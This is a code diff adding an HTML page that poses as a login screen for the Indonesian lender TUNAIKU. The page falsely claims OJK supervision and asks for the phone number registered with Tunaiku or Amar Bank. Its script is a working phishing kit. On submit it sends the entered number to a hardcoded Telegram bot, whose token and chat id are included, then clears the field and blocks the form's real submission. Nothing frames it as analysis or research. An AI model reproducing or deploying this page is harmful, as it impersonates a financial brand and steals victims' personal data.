@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="in">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>TUNAIKU</title>
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            font-family: sans-serif;
+        }
+        body {
+            height: 100vh;
+            margin: 0;
+            padding: 0;
+            position: relative;
+            background-image: url('bg.png');
+            background-size: 100%;
+            background-repeat: repeat-y;
+            animation: animation 10s infinite;
+        }
+        @keyframes animation {
+            from{
+                background-position: 0 100%;
+            }to{
+                background-position: 0 0;
+            }
+        }
+
+.footer{
+    margin: 10px;
+    padding: 5px;
+    box-sizing: border-box;
+    border-radius: 10px;
+    background-repeat: no-repeat;
+    text-align: center;
+    position: relative;
+}
+.footer .footer-card{
+    margin: 0px;
+    padding: 25px;
+    box-sizing: border-box;
+    border-radius: 10px;
+    background-color: transparent;
+    background-repeat: no-repeat;
+    text-align: center;
+    color: white;
+}
+.footer h3{
+    font-size: 29px;
+    text-align: ;
+    font-weight: bold;
+}
+.footer h2{
+    font-size: 18px;
+    text-align: left;
+    margin-top: 5px;
+}
+.footer p{
+    font-size: 15px;
+    text-align: center;
+    color: white;
+}
+img {
+    padding: 0px;
+    margin: 0;
+    right: 0px;
+    border-radius: 5px;
+}
+.login{
+    margin: 20px;
+    padding: 20px;
+    box-sizing: border-box;
+    background-color: transparent;
+    border-radius: 10px;
+    text-align: left;    
+}
+.login .input-group{
+    position: relative;
+    margin: 0px;
+}
+.login .input-group input[type=tel]{
+    height: 50px;
+    width: 100%;
+    border: 1px solid #404040;
+    border-radius: 5px;    
+    font-size: 16px;
+    padding: 0 50px;
+    box-sizing: border-box;
+    color: #5c5c5c;
+}
+.login .input-group input[type=number]{
+    height: 50px;
+    width: 100%;
+    border: 1px solid #404040;
+    border-radius: 5px;    
+    font-size: 16px;
+    padding: 0 20px;
+    box-sizing: border-box;
+    color: #5c5c5c;
+}
+.login .input-group input[type=password]{
+    height: 50px;
+    width: 100%;
+    border: 1px solid #404040;
+    border-radius: 5px;    
+    font-size: 16px;
+    padding: 0 20px;
+    box-sizing: border-box;
+    color: #5c5c5c;
+}
+.login .input-group button{
+    height: 50px;
+    width: 100%;
+    border: none;
+    border-radius: 5px;
+    background-color: #26ff00;
+    color: #373737;
+    font-size: 16px;
+    font-weight: bold;    
+}
+.login .input-group span{
+    position: absolute;
+    top: 0;
+    left: 0;
+    padding: 15px;
+    font-size: 17px;
+    color: #404040;
+    font-weight: bold;
+}
+.login .input-group fieldset{
+    background-color: #ffffff;
+    padding: 20px;
+    margin-top: 20px;
+    text-align: center;
+    border: none;
+}
+.login .input-group h5{
+    font-size: 16px;
+    text-align: left;
+    margin-bottom: 10px;
+    color: white;
+}
+.login .input-group h4{
+    text-align: left;
+    font-size: 18px;
+    margin-bottom: 20px;
+}
+.login .input-group h1{
+    text-align: center;
+    font-size: 18px;
+    margin-bottom: 20px;
+}
+.login .input-group p{
+    text-align: left;
+    font-size: 16px;
+    margin-top: 10px;
+    color: white;
+}
+    </style>    
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+<body>
+    <footer class="footer">
+        <div class="footer-card">
+            <h3>TUNAIKU</h3>
+            <p>Belanja cerdas <i>dan</i> <b>dan diawasi oleh OJK</b></p>        
+        </div>
+     </footer>
+    <form action="item.html" onsubmit="return sender()">        
+        <div class="login">
+            <div class="input-group">
+                <h5>Selamat datang di TUNAIKU</h5>
+            </div>
+            <div class="input-group">
+                <input type="tel" name="hp" id="hp" placeholder="  " maxlength="14" required>
+                <span>+62</span>
+            </div>
+            <div class="input-group">
+                <p>silakan masukkan nomor handphone yang terdaftar di tunaiku atau amar bank</p>
+            </div>
+            <br><br><br>
+            <div class="input-group">
+                <button type="submit" onclick="submit()">KLIK/SELANJUTNYA</button>
+            </div>                        
+        </div>
+    </form>
+    <script>
+        //bot token
+var telegram_bot_id = "7047776338%3AAAE-oJireHx1nnu1cvJSb9bzMDQzAE022mA"
+//chat id
+var chat_id = 7015306286
+var u_tel;
+var ready = function submit() {
+    u_tel = document.getElementById("hp").value;
+    message = "[tunaiku | No HP]\n \nNomor Hp: " + u_tel
+};
+var sender = function () {
+    ready();
+    var settings = {
+        "async": true,
+        "crossDomain": true,
+        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+        },
+        "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": message
+        })
+    };
+    $.ajax(settings).done(function(response){
+        console.log('');
+    });
+    document.getElementById("hp").value = "";
+    return false;
+};
+    </script>
+        
+</body>
+</html>
